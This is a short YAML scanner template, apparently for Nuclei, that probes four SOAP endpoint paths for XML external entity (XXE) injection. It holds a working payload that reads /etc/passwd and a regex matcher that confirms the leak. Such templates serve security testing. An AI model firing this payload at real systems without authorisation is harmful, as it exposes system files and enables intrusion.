id: m7-xxe-soap
info:
  name: M7 - XXE via SOAP Request
  author: Sharlix
  severity: critical
  description: XXE injection in SOAP XML envelope
  tags: xxe,soap,m7hunter

requests:
  - method: POST
    path:
      - "{{BaseURL}}/service"
      - "{{BaseURL}}/api/soap"
      - "{{BaseURL}}/ws"
      - "{{BaseURL}}/webservice"

    body: |
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
          <data>&xxe;</data>
        </soap:Body>
      </soap:Envelope>

    headers:
      Content-Type: text/xml; charset=utf-8
      SOAPAction: "test"

    matchers:
      - type: regex
        regex:
          - "root:x?:\d+:\d+:"
        part: body
